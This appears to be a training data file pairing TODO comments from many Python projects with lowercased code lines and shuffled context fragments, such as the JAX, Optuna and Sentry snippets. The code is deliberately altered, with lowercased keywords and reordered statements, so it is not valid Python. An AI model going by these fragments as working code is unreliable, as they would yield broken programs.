# todo(mattjj): remove this special case, used for debugging on cpu </s> if xb.get_replica_count() == 1:	unshard_array def unshard_array(x): dims = c.GetShape(x).dimensions() return c.Reshape(x, None, (1,) + tuple(dims))
from _devbuild.gen.id_kind_asdl import id  # todo: fix circular dep </s> return self.token.id == id.controlflow_continue	IsContinue def IsContinue(self):
mock = create_mock_json('tests/resources/list_race_details.json')  # todo </s> mock_response.return_value = mock	test_list_available_events @mock.patch('betfairlightweight.endpoints.scores.Scores.request') def test_list_available_events(self, mock_response): response = self.scores.list_available_events() assert mock.json.call_count == 1
# todo(mattjj): test that constants/literals are set up properly </s> self.assertallclose(f1_vjp(y), f2_vjp(y), check_dtypes=true)	test_jarrett_jvps2 _, f2_vjp = api.vjp(f2, x, y)
# todo present sample rate configuration using source.get_sample_rates().values() </s> self.input_rate = input_rate = 3200000	__init__ gr.top_block.__init__(self, "SDR top block") self._running = False self.audio_rate = audio_rate =   32000 self.hw_freq = hw_freq = 98e6
# todo: project_id is tried to load with api_key. do not load it? </s> assert data['exception_cls'] == 'attributeerror', data	test_query_announcement res = self.app_get_json(url + '?api_key=' + user.api_key) data = json.loads(res.data) res = self.app_get_json(url + '?api_key=' + owner.api_key) data = json.loads(res.data)
# todo: this shader is drawn over regular shader now, drawing only one should speed it up </s> vs = ci['vertices']	render if(pcv.dev_normal_colors_enabled): ns = ci['normals'] l = ci['current_display_percent']
#todo, is this the best way to handle </s> self.background_rectangle = backgroundrectangle(self)	DecimalNumber self[-1].align_to(self, UP) if self.include_background_rectangle: self.submobjects = [ self.background_rectangle,
# todo: we haven't read all the data, actually </s> break	handle_tcp raise Exception('failed to send all data') if should_break: finally: sock.close()
#set limit to 25 --> currently hardcoded --> todo: add a setting for this ? </s> etree.subelement(root, "limit").text = "25"	buildVideoNodeForView Rule3 = etree.SubElement(root, "rule", {"field":"rating","operator":"greaterthan"}) etree.SubElement(Rule3, "value").text = "7" etree.SubElement(root, "order", {"direction":"descending"}).text = "rating" WINDOW.setProperty("Emby.nodes.%s.random.title" %str(windowPropId),label)
# todo recover multiple tables at the same time. </s> for table in self.values():	TableManager await self._on_recovery_started() await self.app.consumer.pause_partitions(assigned) await self._recover_from_changelog(table, assigned) await self.app.consumer.resume_partitions({
#todo(nmakhotkin) we should use thing such a decorator here </s> abort(400, e.message)	post return Workbook.from_dict(wb) except ex.MistralException as e:
# todo: check ping response </s> self.asserttrue(self.packet_outs_from_flows(echo_replies))	icmp_ping_controller 'ipv4_dst': '10.0.0.254', 'echo_request_data': bytes('A'*8, encoding='UTF-8')})
# todo(huangyp): make sure striding won't cross segment boundaries. </s> tf.logging.warning('each segment in the packed input should has length '	_StridedAttention if p.packed_input: if stride > 1: 'divisible by stride.') sub_list += [
# todo: add logging </s> pass	parse_gstate def parse_gstate(self, token='gs', params='n'):
# todo: not implemented yet </s> messager.warning('relation search not implemented yet, sorry!')	search_relation def search_relation(directory, type, arg1, arg2): return format_results(SearchMatchSet('empty'))
# todo it is a bit hack-ish, is it possible to find a more generic fix? </s> fwk_str = 'python.framework/versions/2.7/python'	nvcc_module_compile_str except ValueError, e: done = True if fwk_str in cmd: cmd.pop(cmd.index(fwk_str))
# todo: scale and translation could be merged into a single network </s> with tf.variable_scope("scale"):	forward_and_jacobian mask = self.get_mask(inputs, dtype=inputs.dtype) masked_inputs = inputs * mask scale = self.scale_fn(masked_inputs) with tf.variable_scope("translation"):
# todo: handle marked with template </s> return none	should_be_archived duration = str2localized_duration(archiver.site, re_t.group(1)) return {'duration': duration}
# todo - mux support </s> for signal in signals:	Frame signal_value = [] signals = sorted(self.signals, key=lambda s: s.getStartbit()) signal_value.append( signal.phys2raw(data.get(signal.name))
# todo: use shlex.quote as soon as a newer python version is available. </s> self.rubocop_location = pipes.quote(self.rubocop_location)	load_config self.rubocop_location = s.get("rubocop_location") if self.rubocop_location and os.path.isdir(self.rubocop_location): else: self.rubocop_location = ''
categories = category.objects.filter(status=1)  # todo: fix magic number </s> nav_cates = []	get_context_data def get_context_data(self): cates = [] for cate in categories:
except exception:  # todo: refactor this... </s> e = sys.exc_info()[0]	test_POST_InvalidURL try: self.assertEqual(self.rnw.POST(url, data), 'json') self.assertEquals(e, TypeError)
#todo: add method </s> episodeinfo = {'ids': {'imdb': 'tt2161930'}}	doManualRating logger.debug("Getting data for manual %s of non-library '%s' with ID of '%s'" % (action, media_type, data['remoteid'])) if utilities.isEpisode(media_type): summaryInfo = {'title': 'Show Title', 'year': 2015, 'season': data['season'], 'number': data['episode']} userInfo = {'ratings' : globals.traktapi.getEpisodeRatingForUser(data['imdbnumber'], data['season'], data['episode'])}
# todo(stephenfin): enable this once we drop use of </s> conf.register_opts(copy.deepcopy(api_db_opts), group=api_db_group)	register_opts def register_opts(conf):
# todo: fails because of missing svg support </s> page, = parse('''	test_images_17 @assert_no_logs def test_images_17(): <div style="width: 300px; height: 300px"> <img src="
# todo(b/134526360): xla doesn't support integer dots, so we emit a sum of </s> lhs_contract_dims, rhs_contract_dims = contract_dims	dot_general batch_dims = tuple(map(tuple, batch_dims)) if onp.issubdtype(lhs.dtype, onp.integer): lhs_batch_dims, rhs_batch_dims = batch_dims lhs_noncontract_dims = tuple(sorted(
# todo: remove uris, replacing it with support in query language. </s> raise notimplementederror	lookup :rtype: :class:`~mopidy.models.Track`
# todo get tri-letter dimensionality from fit-transform as input shape </s> params.add(engine.param('input_shapes'))	get_default_params params.add(engine.Param('w_initializer', 'glorot_normal')) params.add(engine.Param('b_initializer', 'zeros')) params.add(engine.Param('dim_fan_out', 128)) params.add(engine.Param('dim_hidden', 300))
return none  #todo: fix logic above, inserting this just to fix warnings </s> return d	get_bytes f.close()
# todo(sloria): test me </s> return os.path.join('dropbox', 'files', self.path)	file_url raise ValueError('Path field must be defined.')
chunk_size = 150 # todo: tune </s> for addresses_chunk in chunks(list(instructions), chunk_size):	_async_paint_instructions def _async_paint_instructions(self, instructions): Internal routine for asynchrnous instruction painting. self._paint_instructions(addresses_chunk) if self._repaint_requested:
n)  # todo: access alice's private key inside this method. </s> from nkms.policy.models import policy	create_policy alice_priv_enc = self._crypto_power._power_ups[EncryptingPower].priv_key kfrags, pfrag = self.generate_rekey_frags(alice_priv_enc, bob, m, policy = Policy.from_alice( alice=self,
# todo: remove verify ssl config when working without it. </s> def fetch_island_data(zone_key, session):	fetch_island_data if zone_key == 'ES-CN-FVLZ': lanzarote_fuerteventura_data = LanzaroteFuerteventura(session, verify=False).get_all()
# todo: add json schema validation </s> for api_item in api_items:	load_api_folder api_items_mapping = load_folder_content(api_folder_path) for api_file_path, api_items in api_items_mapping.items(): key, api_dict = api_item.popitem() api_def = api_dict.pop("def")
# todo: re-enable this when we bring back unsubscribe (bug 802379). </s> assert ' for brazil.' in msg.body	test_email_for_one_new_region assert ' added a new ' in msg.body
# todo maybe this could be moved to trakt.media class? </s> return trakt.request(	get_trakt_library @staticmethod def get_trakt_library(media, marked, retry=True): 'user/library/%s/%s.json' % (media, marked), param=Prefs['username'],
# todo: see get_scale_factor() to choose 72 px on hidpi </s> if icon and icon.bind(interface.factory):	pixbuf def pixbuf(clazz, interface, icon): pixbuf = None pixbuf = getattr(icon.bind(interface.factory), 'native_%i' % clazz.icon_size()).get_pixbuf() return pixbuf
# todo: error handling? </s> session_obj.shutdown()	_background_session_stop notebook_server_info=notebook_server_info, ) models.InteractiveSession.query.filter_by( project_uuid=project_uuid, pipeline_uuid=pipeline_uuid
# todo: check if releasing locks early still makes sense </s> _releaselocks(self.lu, locking.level_node_res)	_ExecDrbd8Secondary cstep += 1 self._RemoveOldStorage(self.target_node, iv_names) else: _ReleaseLocks(self.lu, locking.LEVEL_NODE_RES,
node = self.__read_metadata(filepath=metadata_path, federated_only=federated_only)  # todo: 466 </s> return node	LocalFileBasedNodeStorage return certificate metadata_path = self.__generate_metadata_filepath(checksum_address=checksum_address) def store_node_certificate(self, certificate: Certificate): certificate_filepath = self._write_tls_certificate(certificate=certificate)
# todo: load state into here </s> current_chunk +	inner_mapper new_schedule.extend( [CallKernel(kernel_name=new_kernel_name)] + [ReturnFromKernel(kernel_name=new_kernel_name)]) else:
# todo(b/158462888): use aggregete losses that works with replicas. </s> tf.reduce_sum(input_tensor=tf.square(v)) *	l2_regularization_loss ] vf_l2_losses = [ self._value_function_l2_reg for v in unshared_vf_vars_to_regularize ]
# todo: modifiers </s> self._vispy_canvas.events.key_press(action='press', key=key, text=text)	on_key_press except Exception: text = ''
categories = category.objects.filter(status=1)  # todo: fix magic number </s> nav_cates = []	get_common_context def get_common_context(): cates = [] for cate in categories:
# todo: duplicate + replace with psutil.getloadavg()? (available in 5.6.2) </s> load1m, _, _ = os.getloadavg()	set_turbo def set_turbo(): print("\n" + "-" * 5 + "\n") print("Total CPU usage:", cpuload, "%") print("Total system load:", load1m, "\n")
# todo: fix self.cursor_x >= w </s> line = self.output.lines[self.win_y + self.cursor_y]	main_k_ctrl_right def main_k_ctrl_right(self, h, w): x = self.cursor_x while x < len(line) and line[x] == " " and x < w:
# todo: seems like a pandas' bug when fill_value is not none? </s> pdf.groupby(('x', 'a')).shift().sort_index())	test_shift self.assert_eq(kdf.groupby(('x', 'a')).shift().sort_index(),
# todo: make sure limits are deterministic then update this </s> assert not self.viewer.state.x_log	test_hypercube assert self.viewer.state.y_att_world is self.hypercube.id['World 2'] assert self.viewer.state.y_att is self.hypercube.pixel_component_ids[2] assert not self.viewer.state.y_log assert len(self.viewer.state.layers) == 1
pass # todo: explain </s> pass	status402 def status402(self):        # Payment Required
# todo: support speedy mode for running the script </s> shell("make scriptconfig script=kconfiglib/examples/allnoconfig.py")	test_all_no 'make scriptconfig' and needs to reparse the configurations, so kinda slow even in speedy mode.""" shell("mv .config ._config") if speedy_mode:
# todo: find a better random value </s> return datetime.datetime.now()	_auto_value def _auto_value(self, prop): if prop.type == datetime.datetime: elif prop.type == datetime.date: return datetime.date.today()
# todo test this </s> if not (is_release(version)	create_artifacts def create_artifacts(version): TODO docstring or is_weekly_release(version) or is_pre_release(version)):
# todo(yuriyz): change to 404 (bug 1200517) </s> self.assertequal(response.status_int, 500)	test_delete_chassis_not_found uuid = uuidutils.generate_uuid() response = self.delete('/chassis/%s' % uuid, expect_errors=True) self.assertEqual(response.content_type, 'application/json') self.assertTrue(response.json['error_message'])
# todo: we should throw here, i don't like this. </s> log.info('limit "%s" specified, defaulting to max value of "%s"',	ResourceController offset = int(offset) if limit and int(limit) > self.max_limit: limit, self.max_limit) limit = self.max_limit
tol = 0.15  # todo(skye): can we be more precise? </s> jtu.check_grads(np_fn, args_maker(), order=1, atol=tol, rtol=tol)	testFft self._CompileAndCheck(np_fn, args_maker, check_dtypes=True) if dtype in inexact_dtypes: jtu.check_grads(np_fn, args_maker(), order=2, atol=tol, rtol=tol)
# todo the following way of testing is highly sensitive to small changes </s> assert len(model.graph.input) == 23	test_brevitas_to_onnx_export bo.export_finn_onnx(lfc, (1, 1, 28, 28), export_onnx_path) model = onnx.load(export_onnx_path) assert len(model.graph.node) == 24 assert len(model.graph.output) == 1
# todo: clean up </s> yield _pubsubs_fsub	pubsubs_fsub _pubsubs_fsub = _make_pubsubs(hosts, floodsubs, pubsub_cache_size)
# todo(kumar) remove this when validator is fixed, see bug 620503 </s> from validator.testcases import scripting	_validator import validator from validate import validate scripting.SPIDERMONKEY_INSTALLATION = settings.SPIDERMONKEY import validator.constants
# todo: take namespace into account, currently doesn't matter since </s> with session_scope() as db_session:	body_for_message @jsonify def body_for_message(self, message_id): message = db_session.query(Message).join(Message.parts) \ .filter(Message.id==message_id).one()
# todo: support steps and times (motion blur) </s> print("dupli export took %.3fs" % (time() - start))	create_session transformations = array("f", duplis.matrices) luxcore_scene.DuplicateObject(src_name, dst_name, count, transformations) engine.update_progress(index / len_objs)
#todo respect et mapped namespaces </s> itag = xml.tag.split('}', 1)[-1]	__str__ xml = self.xml newoutput = [stringbuffer] if '}' in xml.tag: ixmlns = xml.tag.split('}', 1)[0][1:]
# todo: handle timeout </s> if self.__socket is not none:	read @keyword timeout: the maximum time in millisecond to wait before a message can be reached @type timeout: :class:`int` (data, self.__remoteAddr) = self.__socket.recvfrom(1024) return data
# todo extend to nonbinary nodes </s> if i not in self._input_indices and i in self.context.node_indices:	__init__ else: self._dimension_labels.append(None) past_tpm_on = past_tpm_on.sum(i, keepdims=True) / 2 past_tpm_off = past_tpm_off.sum(i, keepdims=True) / 2
# todo: remove # pylint: disable=fixme </s> self.main_button_min_width_str = "100px"	__init__ self.standard_button_min_width_px: Final = 90 else: self.small_button_min_width_str = "60px" self.tiny_button_min_width_str = "50px"
# todo: remove </s> query_string = get_query_string(request, show_poll=0)	get_rel_url def get_rel_url(self, request): return ''.join((request.path, '?', query_string, '#p', str(self.pk)))
#todo - check annotation </s> return true	compare_records raise ValueError("%i vs %i features" \ % (len(old.features, len(new.features))))
# todo(hvy): whether a pruned trials should have an actual value can be discussed. </s> assert values is none	tell frozen_trial = self._storage.get_trial(trial_id) if state == TrialState.PRUNED: last_step = frozen_trial.last_step if last_step is not None:
# todo(higumachan): remove this "if" section </s> if not _available:	objective def objective(trial): pytest.skip('This test requires keras ' 'but this version can not install keras(tensorflow) with pip.')
# todo watch out because urllib.unquote will blow up on unicode text </s> msg = self.server.backend.message(session_id, urllib.unquote(text))	HttpHandler self.wfile.write("{'phone':'%s', 'message':'%s'}" % (session_id, str(msg_store[session_id].pop(0)))) return self.server.backend.route(msg) self.send_response(200)
# todo: edit once we get the properly labeled entity ids from nalanda </s> entry['description'] = entry['entity_id']	_add_full_title_from_topic_tree entry['description'] = video_title_dict[entry_name]['title'] except KeyError: return entry
# todo: think about moving this to model_eval mtry function </s> if not mtry:	deploy use_saved_model=use_saved_model) if self.modeltype == 'classification' and method == 'rf': mtry = math.floor(math.sqrt(len(self.X_train.columns.values))) algorithm = RandomForestClassifier(n_estimators=trees,
# todo: enable non-windows methods in configure </s> env_build = autotoolsbuildenvironment(self)	build self.run("%s && nmake /f makefile" % vcvars) else: with tools.environment_append(env_build.vars): with tools.chdir("CPP/7zip/Bundles/LzmaCon"):
# todo: there’s a vertical 0.5px shift on the second page </s> assert_pixels('collapsed_border_thead', 22, 36, '''	test_tables_9 @assert_no_logs def test_tables_9(): ______________________ _BBBBBBBBBBBBBBBBBBBB_
# todo: move to base class </s> return self._manipulationmode	Canvas @property def manipulationMode(self): @manipulationMode.setter def manipulationMode(self, value):
# todo check the op returned a view </s> if dmap and idx in dmap:	summary_memory vmap = getattr(node.op, 'view_map', None) for idx, v in enumerate(val): node_memory_saved_by_inplace += v elif vmap and idx in vmap:
# todo complete this method </s> partition, kptlist, dtype)	eeccsd return ipccsd(eom, nroots, koopmans, guess, left, eris, imds,
# todo(dcramer): this should respect rate limits/etc and use the normal </s> if self.remote.is_active():	send def send(self, **kwargs): from sentry import options extra_tags = {
# todo: theme me </s> labels = []	draw title = TextArea(self.title, textprops=dict(color='k', weight='bold')) entries = [title] for txt in self.key['label']: labels.append(TextArea(txt, textprops=dict(color='k')))
# todo: temporary hack until they fix </s> handle_tr_writer_deprecation()	test_report_title_addopts_env_var def test_report_title_addopts_env_var(self, testdir, monkeypatch): report_location = "REPORT_LOCATION" report_name = "MuhReport"
# todo: we need to pick the rank from `comm_shm`, not `comm`, </s> objcomm = none	_ @_initialize.register(EntryFunction) def _(iet): for i in iet.parameters: if isinstance(i, MPICommObject):
# todo: this is untested. </s> _raise_current_error()	load_certificate_request raise ValueError("type argument must be FILETYPE_PEM or FILETYPE_ASN1") if req == _ffi.NULL: x509req = X509Req.__new__(X509Req) x509req._req = _ffi.gc(req, _lib.X509_REQ_free)
# todo check error message </s> assert app_is_installed(secondary_domain, "legacy_app")	test_legacy_app_install_path_unavailable with pytest.raises(YunohostError): install_legacy_app(secondary_domain, "/") assert app_is_not_installed(secondary_domain, "legacy_app__2")
return self.edited # fallback todo log? </s> dts = m.group(1) + ' ' + m.group(2) + ' ' + m.group(3)	created m = re.fullmatch(r'(\w+) (\d+)\w+, (\d+)', title) if m is None: dt = datetime.strptime(dts, '%B %d %Y') return pytz.utc.localize(dt)
# todo: custom exception (?) </s> raise invalidcredsexception()	host ) if scheme is "https" and self.secure is not 1: self.__host = server self.connection.close()
return 0.0 #todo - return nan or none here? </s> else :	calc_gc_skew c = sequence.count('C') + sequence.count('c') if g+c == 0 : return (g-c)/float(g+c)
# todo: add test case </s> def test_ulib():	test_ulib from pydu.compat import ulib pass
# todo need to send a browse request for the object to be populated </s> return utils.load(self, timeout=timeout)	load :type timeout: float :returns: self
# todo: handle errors better </s> abort(	patch except sqlalchemy.exc.IntegrityError as e: db.session.rollback() code=http_exceptions.Conflict.code, message="Could not update user details."
# todo allow first arg to be string name, class type or func </s> def remove_augmenters(self, func, copy=true, noop_if_topmost=true):	remove_augmenters Parameters ----------
#todo?# self.asserttrue(greps(err, "unit zzz.service not for --user mode")) </s> logg.info("== 'restart' shall start a service that not is-active")	bad_usermode_simple_service_functions logg.info(" %s =>%s \n%s\n%s", cmd, end, err, out) self.assertEqual(end, 1) #TODO? cmd = "docker exec {testname} {systemctl} restart zzz.service -vvvv" out, err, end = output3(cmd.format(**locals()))
# todo packages for cloudera not available on lucid yet, using karmic for the moment (beta 1) </s> pass	_setup_hadoop http://archive.cloudera.com/docs/ec2.html http://archive.cloudera.com/cdh/3/
# todo: support more than just lists </s> self._unify(types.tlist(node.type), node.value.type,	visit_SubscriptT def visit_SubscriptT(self, node): node.loc, node.value.loc) return node
# todo: this is a good place to detect and react to a loop, </s> if eth_src in vlan.host_cache:	learn_host_on_vlan_ports now = time.time() ofmsgs = [] entry = vlan.host_cache[eth_src] if port == entry.port:
# todo: move the logic somewhere else </s> out_ind = [()]	random_integers_helper dim_len = max(low.shape[dim], high.shape[dim]) out_size = out_size + (dim_len,) low_ind = [()] high_ind = [()]
pass  # todo: implement. </s> def build(self, builder):	LookupFlagStatement self.markFilteringSet = markFilteringSet
# todo: segwit stuff </s> if not self.address:	update_unlocking_script self.address = self.keys[0].address() elif self.script_type in ['p2wsh', 'p2sh_p2wsh']: self.address = self.keys[0].address() if self.unlocking_script_unsigned:
# todo: warning? exception? </s> return s	to_bytes elif isinstance(s, six.text_type): return s.encode('utf8')
raise notimplementederror # todo </s> def em_step(self):	EM_step
# todo: remove when materialized paths are fixed in the payload returned from waterbutler </s> if not new_file.materialized_path.startswith('/'):	create_new_file if destination['provider'] != 'osfstorage': new_file.update(revision=None, data=data) new_file.materialized_path = '/' + new_file.materialized_path new_file.save()
# todo: documentation pending </s> parameters	save_weights def save_weights(self, filepath, sess=None): ---------- filepath
# end todo </s> w_diag_ggn = einsum('bkc->k', (sqrt_ggn**2, ))	weight_diag_ggn sqrt_ggn = sqrt_ggn.view(num_classes, batch, module.weight.numel()) sqrt_ggn = einsum('cbk->bkc', (sqrt_ggn, )) return w_diag_ggn.view_as(module.weight)
# todo: this implementation should be revisited </s> prologue = hritprologue().get()	read_prologue def read_prologue(self): impf_rec = L15DataHeaderRecord().impf_configuration impf_configuration = np.dtype(impf_rec).newbyteorder('>')
#todo: allow changing of default roles associated with history </s> if trans.user:	set_default_permissions @web.expose def set_default_permissions( self, trans, **kwd ): if 'set_permissions' in kwd: history = trans.get_history()
# todo(@awav): may need them for other models </s> z = inducingpoints(rng.randn(m, input_dim))	test_other_models_full_cov def test_other_models_full_cov(model_setup, input_dim, output_dim, N, Ntest, M): covar_shape = (output_dim, Ntest, Ntest) Xtest = rng.randn(Ntest, input_dim) model_gp = model_setup.get_model(Z)
# todo: move to ab callback </s> self.session.add_event(event.event_contact_reject_succeed, account)	_handle_action_reject_contact papycontact = self.address_book.contacts.search_by('account', account) self.address_book.decline_contact_invitation(papycontact)
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
# todo: add this back in once we've merged back the refactored users code </s> self.assertequals(commcare_users_count, 1)	testUnlinkOrphanCommCareUser commcare_users_count = CouchUser.view("users/commcare_users_by_domain_username", key=[self.domain, self.commcare_username]).total_rows
# todo consolidate this and pr plotter into 1 function </s> colors = ['b', 'g', 'r', 'c', 'm', 'y', 'k']	roc_plot_from_predictions def roc_plot_from_predictions(y_test, y_predictions_by_model, save=False, debug=False): plt.figure() plt.xlabel('False Positive Rate')
#todo: call _update_node_rule_for_parents </s> self._update_node_parents([u, v])	add_edge nx.DiGraph.add_edge(self, u, v)
#todo avoid doing this since a may be a different sparse type </s> ah = aslinearoperator(asmatrix(a).h)	cgne AH = A.H else: A,M,x,b,postprocess = make_system(A,M,x0,b,xtype) dimen = A.shape[0]
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo: code not valide as accountcode moved to his own model accountcode </s> voipplan_id = userprofile.objects.get(accountcode=accountcode).voipplan_id	push_asterisk_cdr direction = "unknown" try: except: voipplan_id = False
#todo: kvick we should rename 'short_circuit' to something like 'disable_service_start' </s> if config.get('short_circuit', false):	_configure_chroot log.critical('Installation of provisioning config failed') return False if not self._disable_service_startup(): log.critical('Failure short-circuiting files')
# todo: logging </s> contract_sizes = dict()	deploy_contract deploy_transaction = {'from': self.deployer_address} deploy_bytecode = contract_factory.constructor(*args, **kwargs).buildTransaction(deploy_transaction) if len(deploy_bytecode['data']) > 1000: contract_sizes[contract_name] = str(len(deploy_bytecode['data']))
# todo: is that right? </s> pass	unindex_documents es.delete(index, doc_type=Document._meta.db_table, id=doc_id) except pyes.exceptions.NotFoundException:
# todo: remove this when domain decomposition is merged </s> warnings.warn('this feature is not yet implemented in a release ' \	set_dd_mesh_dimension def set_dd_mesh_dimension(self, dimension): 'version of openmc') if not isinstance(dimension, tuple) and \
#     # todo: add an exception message </s> parts = {}	DateTimeParser for token in fmt_tokens: if token == "Do":
# todo: check pdf content? how? </s> class fake_file(object):	test_python_render _+_+_+_+_+_+_+_, ]) def __init__(self): self.chunks = []
#todo: this should be reading from the wcs object </s> ymin = self.center.y - self.dimensions[1] / 2. * self.scale.y	yrange @property def yrange(self): ymax = self.center.y + self.dimensions[1] / 2. * self.scale.y return u.Quantity([ymin, ymax])
# todo: change logic to c_leq based on benchmarking </s> transformationfactory('contrib.deactivate_trivial_constraints')\	solve_NLP_subproblem if not nlp_var.fixed and not nlp_var.is_binary(): nlp_var.value = orig_val .apply_to(fixed_nlp, tmp=True, ignore_infeasible=True) with SuppressInfeasibleWarning():
# todo: how to handle not found authorname </s> result = db.session.query(db.authors).filter(db.authors.sort == auth.lstrip().strip()).first()	show_book error = False for auth in sort_authors: if not result: error = True
group_id='test-consumer',  # todo: what belongs here? </s> bootstrap_servers=[settings.kafka_url],	iter_changes consumer = KafkaConsumer( self._topic, consumer_timeout_ms=timeout, )
# todo: use weight scaling factor if provided, xavier's default else </s> self.weights = sharedx(	DenoisingAutoencoder borrow=True ) .5 * rng.rand(conf['n_vis'], conf['n_hid']) * conf['irange'], name='W',
# todo: clocksignal, resetsignal </s> raise notimplementederror	assign self.assign(node.choices[self.eval(node.key)], value) else:
# todo: looks like xform has a add_bind method. look into it. </s> ns = "{%s}" % xform_root.nsmap[none]	_ucla_form_modifier tag = hidden_value_path.replace("/data/", "") data_node.append(etree.Element(ns+tag)) itext_node = xform_root[0][1].find(ns+"itext") bind_node = etree.Element(ns+"bind")
# todo: accept these via quirks? </s> desired_bus = os.environ.get('libusb_bus')	__init__ Creates a new libusb backend for communicating with a target device. self.verbose = verbose desired_port = os.environ.get('LIBUSB_PORT') if desired_bus and desired_port:
# todo(sloria): test me </s> return os.path.join('dropbox', 'files', self.path)	file_url raise ValueError('Path field must be defined.')
# todo refactor like in https://github.com/guardicore/monkey/pull/1528 because </s> setup_data_dir(str(config.data_dir))	_setup_config_by_cmd_arg server_config_path = expand_path(server_config_path) config = server_config_handler.load_server_config_from_file(server_config_path) return config, server_config_path
pass  # todo </s> def test_shape(self):	test_shape
# * todo heading 1 --> </s> vim.current.window.cursor = (2, 0)	test_circle_through_todo_states def test_circle_through_todo_states(self): Todo.toggle_todo_state() self.assertEqual(vim.current.buffer[1], '* TODO Heading 1')
# todo: split into a function + context manager </s> with make_tempfile(mkdir=true) as new_home:	setup_package from datalad.utils import make_tempfile from datalad.tests import _TEMP_PATHS_GENERATED os.environ['HOME'] = new_home os.makedirs(new_home)
# todo: fix with stubber / before send event </s> with mock.patch('botocore.endpoint.endpoint._send') as \	test_predict def test_predict(self): http_session_send_patch: http_response = mock.Mock()
# todo: fix highlight handling </s> series = ''.join(data.xpath('./div[@class="desc"]/div[@class="detailshortlist"]/div[last()]/a/@title'))	search title = title + '. ' + title2 if (''.join(data.xpath('./div[@class="desc"]/div[@class="detailShortList"]/div[last()]/span/text()')).strip() == "Seria:"): title = title + ' (seria ' + series + ')' author = ', '.join(data.xpath('./div[@class="desc"]/div[@class="detailShortList"]/div[@class="row"][1]/a/@title'))
# todo what about "check_existing" ? </s> id_ = collection.load(filepath)	bpy_data_ctor if collection_name == "sounds": filepath = proxy.data("filepath") return id_ name = proxy.data("name")
# todo: i think this should use '$ fileregions' </s> return self.id1.get_next_segment(ea).bounds.start	NextSeg def NextSeg(self, ea):
#todo: error checking </s> return expression('list', *self.chunks(l.get_leaves(), n.get_int_value(), d.get_int_value()))	Partition def apply(self, l, n, d, evaluation): 'Partition[l_List, n_Integer, d_Integer]'
# todo (t65593688): this should be removed after </s> with torch.no_grad():	test_tokens_contextual def test_tokens_contextual(self): model = Seq2SeqModel.from_config( Seq2SeqModel.Config(
# todo: support for multiple message versions </s> self.info.category, msg[1]	run raise "unsupported message-version ({}, {})".format(
# todo: remove in sopel 8 </s> if hasattr(func, 'rule') and isinstance(func.rule, basestring):	clean_callable else: func.event = [event.upper() for event in func.event] LOGGER.warning( 'The `rule` attribute of %s.%s should be a list, not a string; '
pass  # todo </s> def test_pictures(self):	test_pictures
raise mpdnotimplemented # todo </s> def _sticker_set(self, type, uri, name, value):	_sticker_set @register(r'^sticker set "(?P<type>[^"]+)" "(?P<uri>[^"]+)" "(?P<name>[^"]+)" "(?P<value>[^"]+)"$')
recording_software_version = none  # todo </s> recording_name = none  # todo	_recording_update_legacy_from_v1_15_to_pprf_2_0 duration_s = None  # TODO recording_software_name = None  # TODO system_info = None #TODO new_info_file = RecordingInfoFile.create_empty_file(rec_dir)
# todo: read this from config </s> display_error_count = 5	render_isos_step self.prompt.write(_('... completed')) self.prompt.render_spacer() num_errors = min(len(data['error_details']), display_error_count) if num_errors > 0:
# todo: trigger via dummy audio? </s> self.playback.on_about_to_finish()	trigger_about_to_finish def trigger_about_to_finish(self): self.audio.prepare_change()
# todo(kgriffs): measure initial time, and keep iterating until </s> bench(bm, bm_iterations * jit_warming_multiplier, false)	run if PYPY: print('{}: JIT warmup'.format(name)) bm_iterations = iterations if iterations else determine_iterations(bm) benchmarks.append((name, bm_iterations, bm))
# todo refactor with np.tile or sth </s> norms = norms[..., np.newaxis, np.newaxis]	importance if len(weight.shape) > 2: norms /= activation.shape[1] * activation.shape[2] norms = np.repeat(norms, weight.shape[2], axis=1) norms = np.repeat(norms, weight.shape[3], axis=2)
assert study_id == 0  # todo </s> self.trials[trial_id].params[param_name] = value	report_param def report_param(self, study_id, trial_id, param_name, value):
# todo also check for motion codec parameter support </s> return 'hevc_nvenc' in codecs.get('hevc', {}).get('encoders', set())	has_hevc_nvenc_support if not binary: return False
# todo: custom gremlin method </s> pass	create_edge_label def create_edge_label(self, label):
# todo: must be implemented </s> pass	get_crawlers_to_search def get_crawlers_to_search(self, links):
# todo(ytknzw): add more specific assertion with the test case. </s> study = create_study()	test_plot_intermediate_values trial.report(2.0, step=1) return 0.0 study.optimize(lambda t: objective(t, True), n_trials=1) figure = plot_intermediate_values(study)
# todo: move this function somewhere else </s> def get_raw_directory_stats(path_obj):	get_raw_directory_stats Example:: {'translated': {'units': 0, 'percentage': 0, 'words': 0},
# todo: account for line widths and style </s> data = []	Line3DBox super(Line3DBox, self).process_option(name, value) def to_json(self): for line in self.lines: data.append({
# todo: add test here as well </s> assert chatcommands.iswlu("4622463 stackoverflow", original_msg=msg) == \	test_whitelisted_users assert chatcommands.addwlu("4622463 stackoverflow", original_msg=msg) == \ "User whitelisted (`4622463` on `stackoverflow.com`)." "User is whitelisted (`4622463` on `stackoverflow.com`)." assert chatcommands.rmwlu("4622463 stackoverflow", original_msg=msg) == \
# todo delete? we should search for valid parser </s> completion_names += self._simple_complete(path, dot, like)	get_completions self._pos, module) return completion_names
help='') # todo </s> parser.add_argument(	main '--table', action='store_true', '--minimal', action='store_true',
# todo: remove save parameter </s> self.save()	set_permissions if save:
#@todo: move this and other methods out of this file , into a general </s> from utilities.prefs_constants import dnabaseindicatorsangle_prefs_key	get_dna_base_orientation_indicator_dict Returns two  dictoinaries for DNA bases perpendicular and anti-perpendicular to a plane specified by the plane normal vector. from utilities.prefs_constants import dnaBaseIndicatorsDistance_prefs_key indicators_angle = env.prefs[dnaBaseIndicatorsAngle_prefs_key]
#todo: write a doc string for this method </s> return tuple([self.shape_ir(i,r) for i in xrange(r.ndim)])	shape_tuple def shape_tuple(self, r):
codecs.decode('5050827d08000000d00745b2cf451b00', 'hex'),  # tcp random cmd_ack_ok todo: generate proper sequenced response </s> ]	test_tcp_live_connect codecs.decode('5050827df8030000f401ae4301000000f19449000000120c07130906', 'hex'), # reg_event! codecs.decode('5050827d08000000d007fcf701003200', 'hex'),  # tcp CMD_ACK_OK zk = ZK('192.168.1.201')#, verbose=True) conn = zk.connect()
